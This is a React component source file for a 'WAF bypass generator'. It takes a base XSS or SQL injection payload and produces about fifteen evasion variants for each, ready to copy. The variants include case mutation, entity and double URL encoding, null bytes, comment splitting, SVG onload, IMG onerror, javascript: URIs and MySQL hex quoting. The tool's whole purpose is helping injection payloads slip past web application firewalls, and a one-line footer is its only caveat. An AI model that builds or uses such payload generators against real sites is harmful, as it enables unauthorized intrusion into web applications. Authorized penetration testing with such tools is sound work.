import { useState } from "react";
import CyberpunkCard from "@/components/CyberpunkCard";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Copy, Check } from "lucide-react";

type TabType = "xss" | "sqli";

const generateXSSVariants = (payload: string): { label: string; variant: string }[] => {
  const raw = payload || "<script>alert(1)</script>";
  return [
    { label: "Original", variant: raw },
    { label: "Case Mutation", variant: raw.replace(/<script>/gi, "<ScRiPt>").replace(/<\/script>/gi, "</ScRiPt>") },
    { label: "HTML Entity (numeric)", variant: raw.replace(/</g, "&#60;").replace(/>/g, "&#62;") },
    { label: "HTML Entity (hex)", variant: raw.replace(/</g, "&#x3C;").replace(/>/g, "&#x3E;") },
    { label: "Double URL Encoded", variant: encodeURIComponent(encodeURIComponent(raw)) },
    { label: "Null Byte Injection", variant: raw.replace(/<script/gi, "<scr\x00ipt") },
    { label: "Comment Insertion", variant: raw.replace(/<script>/gi, "<sc/**/ript>") },
    { label: "Unicode Escape (attr)", variant: raw.replace(/alert/g, "\\u0061lert") },
    { label: "SVG onload", variant: `<svg onload=${raw.match(/alert\([^)]*\)/)?.[0] || "alert(1)"}/>` },
    { label: "IMG onerror", variant: `<img src=x onerror="${raw.match(/alert\([^)]*\)/)?.[0] || "alert(1)"}">` },
    { label: "JavaScript URI", variant: `javascript:${raw.match(/alert\([^)]*\)/)?.[0] || "alert(1)"}` },
    { label: "Backtick (template)", variant: `<svg/onload=\`${raw.match(/alert\([^)]*\)/)?.[0] || "alert(1)"}\`>` },
    { label: "Tab/Newline Break", variant: raw.replace(/<script>/gi, "<scr\tipt>") },
    { label: "Uppercase URL Encode", variant: raw.replace(/</g, "%3C").replace(/>/g, "%3E").toUpperCase() },
    { label: "Expression CSS (legacy IE)", variant: `<div style="width:expres/**/sion(${raw.match(/alert\([^)]*\)/)?.[0] || "alert(1)"})">` },
  ];
};

const generateSQLiVariants = (payload: string): { label: string; variant: string }[] => {
  const raw = payload || "' OR '1'='1";
  return [
    { label: "Original", variant: raw },
    { label: "Case Mutation", variant: raw.toUpperCase().replace(/OR/g, "oR").replace(/SELECT/g, "sElEcT") },
    { label: "Comment Break", variant: raw.replace(/ OR /gi, " /*!OR*/ ").replace(/ AND /gi, " /*!AND*/ ") },
    { label: "Whitespace Variants (tab)", variant: raw.replace(/ /g, "\t") },
    { label: "Whitespace Variants (newline)", variant: raw.replace(/ /g, "\n") },
    { label: "URL Encoded", variant: encodeURIComponent(raw) },
    { label: "Double URL Encoded", variant: encodeURIComponent(encodeURIComponent(raw)) },
    { label: "Hex Encode (MySQL)", variant: raw.replace(/'/g, "0x27") },
    { label: "Inline Comment Fragmentation", variant: raw.replace(/SELECT/gi, "SE/*a*/LECT").replace(/UNION/gi, "UN/*b*/ION") },
    { label: "Scientific Notation", variant: raw.replace(/1/g, "1e0") },
    { label: "Negative Logic", variant: raw.replace(/OR '1'='1'/g, "OR NOT 1=2") },
    { label: "Equivalence", variant: raw.replace(/=/g, " LIKE ") },
    { label: "Null Byte", variant: raw + "%00" },
    { label: "Unary Plus", variant: raw.replace(/1/g, "+1") },
    { label: "Unicode Wide", variant: raw.replace(/'/g, "ʼ") },
  ];
};

const CopyButton = ({ text }: { text: string }) => {
  const [copied, setCopied] = useState(false);
  const handleCopy = () => {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 1200);
    });
  };
  return (
    <button onClick={handleCopy}
      className="px-2 py-1 rounded text-xs bg-cyber-cyan/10 hover:bg-cyber-cyan/20 text-cyber-cyan border border-cyber-cyan/20 transition-colors flex-shrink-0">
      {copied ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
    </button>
  );
};

const WAFBypassGenerator = () => {
  const [tab, setTab] = useState<TabType>("xss");
  const [payload, setPayload] = useState("");

  const variants = tab === "xss" ? generateXSSVariants(payload) : generateSQLiVariants(payload);

  return (
    <CyberpunkCard title="WAF BYPASS GENERATOR">
      <div className="space-y-5">
        <div className="flex gap-2">
          {(["xss", "sqli"] as TabType[]).map((t) => (
            <button
              key={t}
              onClick={() => setTab(t)}
              className={`px-5 py-2 rounded text-sm font-bold transition-colors uppercase ${
                tab === t
                  ? "bg-cyber-red text-white"
                  : "bg-cyber-cyan/20 text-cyber-cyan border border-cyber-cyan/30 hover:bg-cyber-cyan/30"
              }`}
            >
              {t === "xss" ? "XSS" : "SQL Injection"}
            </button>
          ))}
        </div>

        <div>
          <label className="block text-xs text-cyber-cyan tracking-wider mb-2">
            BASE PAYLOAD (leave empty to use default)
          </label>
          <Input
            value={payload}
            onChange={(e) => setPayload(e.target.value)}
            placeholder={tab === "xss" ? "<script>alert(1)</script>" : "' OR '1'='1"}
            className="bg-black/50 border-cyber-cyan/30 text-cyber-cyan font-mono"
          />
        </div>

        <div className="space-y-2">
          <h3 className="text-cyber-cyan font-bold tracking-wide text-sm">
            {variants.length} BYPASS VARIANTS
          </h3>
          {variants.map((v, i) => (
            <div key={i} className="glass-panel rounded p-3">
              <div className="flex items-center justify-between mb-1">
                <span className="text-xs text-gray-400">{v.label}</span>
                <CopyButton text={v.variant} />
              </div>
              <code className="text-xs text-green-400 font-mono break-all">{v.variant}</code>
            </div>
          ))}
        </div>

        <p className="text-xs text-gray-500">
          These variants are for authorized security testing only. Always obtain permission before testing.
        </p>
      </div>
    </CyberpunkCard>
  );
};

export default WAFBypassGenerator;
